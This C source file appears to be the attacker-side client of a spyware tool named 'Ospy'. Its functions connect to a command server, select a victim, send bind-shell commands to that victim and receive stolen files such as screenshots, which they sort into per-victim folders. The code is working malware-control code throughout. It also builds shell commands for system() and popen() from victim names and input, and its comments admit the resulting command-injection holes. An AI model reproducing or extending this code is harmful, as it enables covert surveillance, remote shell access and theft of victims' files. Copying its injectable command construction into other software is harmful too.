#include "connection.h"
#include "utilities.h"

#define ENCRYPTED_RECEIVED_FILE_NAME "Ospy/.temp_enc_file"
#define MAX_COMMEN_LEN 200
#define CREATE_FOLDER_CMD_LEN 100


CONNECTION_STATUS create_connection(){
	struct sockaddr_in server_address;
	attacker_socket = socket(AF_INET, SOCK_STREAM, 0);
	if(attacker_socket < 0)
		return CONNECTION_FAILURE;
		
	memset(&server_address, '\0', sizeof(server_address));
	server_address.sin_family = AF_INET;
	server_address.sin_port = htons(PORT);
	server_address.sin_addr.s_addr = inet_addr(SERVER_IP);	
	if(connect(attacker_socket, (struct sockaddr*)&server_address, sizeof(server_address)) < 0)
		return CONNECTION_FAILURE;
	return CONNECTION_SUCCESS;
}

// attacker to server encrypted message handler, get main_data struct and encrypt it in aes 
void A_2_S_encrypted_message_handler(main_data data, action_type action) { // victim - server 
	encrypted_general_message_protocol encrypted_message;
	encrypted_message.i_am = ATTACKER;
	encrypted_message.action = action;
	switch (action) {
		case LOG_IN :
			strcpy(encrypted_message.data.encrypted_login_to_Ospy.username, encrypt_text (data.login_to_Ospy.username, AES_KEY));
			
			strcpy(encrypted_message.data.encrypted_login_to_Ospy.password, encrypt_text (data.login_to_Ospy.password, AES_KEY));

			break;
			
		case REGISTER :
			
			strcpy(encrypted_message.data.encrypted_register_to_Ospay.username, encrypt_text (data.register_to_Ospay.username, AES_KEY)); 
			
			strcpy(encrypted_message.data.encrypted_register_to_Ospay.password, encrypt_text (data.register_to_Ospay.password, AES_KEY)); 
			
			strcpy(encrypted_message.data.encrypted_register_to_Ospay.license_key, data.register_to_Ospay.license_key); 
			
			break;
			
		case BUY_LICENSE_KEY :
			
			strcpy(encrypted_message.data.encrypted_buy_license_key.username, encrypt_text (data.buy_license_key.username, AES_KEY));
			
			strcpy(encrypted_message.data.encrypted_buy_license_key.password, encrypt_text (data.buy_license_key.password, AES_KEY));
			
			break;
		
		case SEND_BIND_SHELL_COMMAND :
			strcpy(encrypted_message.data.bind_shell_command, encrypt_text (data.bind_shell_command, AES_KEY));
			break;
		
		case SELECT_VICTIM :
			strcpy(encrypted_message.data.selected_victim_name, encrypt_text (data.selected_victim_name, AES_KEY));
			break;
		
		default :
			break;
	}
	send(attacker_socket, &encrypted_message, sizeof(encrypted_message),0);
}

void bace64_to_original_convertor (char * path_to_decoded_file){
	// exempal of "openssl aes-256-cbc -base64 -in Ospy/temp_enc_file -out Ospy/ori_mac_mini/screenshots/screenshot_WedDec517:33:292018.jpg -d -k AES_KAY
	char commend [MAX_COMMEN_LEN];
	sprintf(commend, "openssl aes-256-cbc -base64 -in %s -out %s -d -k %s",ENCRYPTED_RECEIVED_FILE_NAME, path_to_decoded_file, AES_KEY); // there is injection variability, to be fix
	system(commend);
}

void crate_folders (char * victim_name, char * attack_type){
	char create_folders[CREATE_FOLDER_CMD_LEN];
	sprintf(create_folders, "mkdir -p Ospy/%s/%s", victim_name, attack_type);
	system(create_folders);
}

FILE_RECEIVING_STATUS recv_file (char * victim_name, char * file_name, char * file_extension, char * attack_type){	
	FILE * encrypted_receved_file;
	encrypted_file_transformation_protocol temp_file_data;
	
	char temp_checksum_full_buffer[MTU + HASH_LEN];
	char temp_checksum[HASH_LEN];
	
	bzero(temp_file_data.file_sub_buffer, MTU); 
	strcpy(temp_checksum, "\0");
	memset(temp_checksum_full_buffer, '0', strlen(temp_checksum_full_buffer));
	temp_file_data.end_of_file = 0;
		
	time_t rawtime = time(NULL);
	if (rawtime == -1) {
		puts("The time() function failed");
		exit(1);
	}
	struct tm *ptm = localtime(&rawtime);
	if (ptm == NULL) {
		puts("The localtime() function failed");
		exit(1);
	}
	crate_folders(victim_name, attack_type);
		
	encrypted_receved_file = fopen(ENCRYPTED_RECEIVED_FILE_NAME, "w");
	if(encrypted_receved_file == NULL)
		return FAILED_RECEIVING_FILE;
			
	while (recv(attacker_socket, temp_file_data.file_sub_buffer, sizeof(encrypted_file_transformation_protocol),0) > 0){
		if (temp_file_data.end_of_file)
			break;
		strcpy(temp_checksum_full_buffer, temp_checksum);
		strcat(temp_checksum_full_buffer, temp_file_data.file_sub_buffer);
		strcpy(temp_checksum, md5(temp_checksum_full_buffer));
		fputs(temp_file_data.file_sub_buffer, encrypted_receved_file);
		fflush(encrypted_receved_file);
		bzero(temp_file_data.file_sub_buffer, MTU);
	}
	fclose(encrypted_receved_file);
	if (strcmp(temp_checksum, temp_file_data.checksum) != 0)
		return FAILED_RECEIVING_FILE;
	
	// exempal of "file_path" : Ospy/ori_mac_mini/screenshots/screenshot_16b1c83de8f9518e673838b2d6ea75dc
	char file_path[MAX_USER_NAME_LEN + 100];
	sprintf(file_path,"Ospy/%s/%s/%s_%s%s", victim_name, attack_type, file_name, temp_checksum, file_extension);
//	sprintf(file_path,"Ospy/%s/%s/%s_%d_%02d_%02d:%02d:%02d%s", victim_name, attack_type, file_name, (ptm->tm_year+1900), (ptm->tm_mon + 1), ptm->tm_hour, ptm->tm_min, ptm->tm_sec, file_extension);
	bace64_to_original_convertor(file_path);
//	printf("\r[#] Hash checksum : %s\n", temp_file_data.checksum);
	return FILE_RECEIVED;
}

void recv_file_and_print_it (){
	encrypted_file_transformation_protocol temp_file_data;
	bzero(temp_file_data.file_sub_buffer, MTU); 
	temp_file_data.end_of_file = 0;
	while (recv(attacker_socket, temp_file_data.file_sub_buffer, sizeof(encrypted_file_transformation_protocol), 0) > 0){
		if (temp_file_data.end_of_file)
			break;
		printf("%s", temp_file_data.file_sub_buffer);
		bzero(temp_file_data.file_sub_buffer, MTU);
	}
}

// AES 256 cbc encryption
char * encrypt_text (char * text_to_encrypt, char * encrypt_key){
	int max_len = (strlen(text_to_encrypt) * 1.36) + 100;
	char * encrypted_text = (char *) malloc(max_len * sizeof(char));
	char sub_buffer[65];
	char encrypt_commend[40 + strlen(text_to_encrypt) + strlen(encrypt_key)];
	sprintf(encrypt_commend, "echo %s | openssl aes-256-cbc -base64 -k %s", text_to_encrypt, encrypt_key); // there is injection variability, to be fix
	FILE * aes_encryption_fd = popen(encrypt_commend, "r");
	while (fgets(sub_buffer, sizeof(sub_buffer), aes_encryption_fd) != NULL) {
		strtok(sub_buffer, "\n");
		strcat(encrypted_text, sub_buffer);
	}
	pclose(aes_encryption_fd);
	return encrypted_text;
}

//AES 256 cbc decryption
char * decrypt_text (char * text_to_decrypt, char * decryption_key){
	strtok(text_to_decrypt, "\n");
	char * decrypted_text = (char *) malloc(strlen(text_to_decrypt) * sizeof(char));
	char sub_buffer[65];
	char decrypt_commend[40 + strlen(text_to_decrypt) + strlen(decryption_key)];
	sprintf(decrypt_commend, "echo %s | openssl aes-256-cbc -d -base64 -k %s", text_to_decrypt, decryption_key);// there is injection variability, to be fix

	FILE * aes_decryption_fd = popen(decrypt_commend, "r");
	while (fgets(sub_buffer, sizeof(sub_buffer), aes_decryption_fd) != NULL) {
		strtok(sub_buffer, "\n");
		strcat(decrypted_text, sub_buffer);
	}	
	pclose(aes_decryption_fd);
	return decrypted_text;
}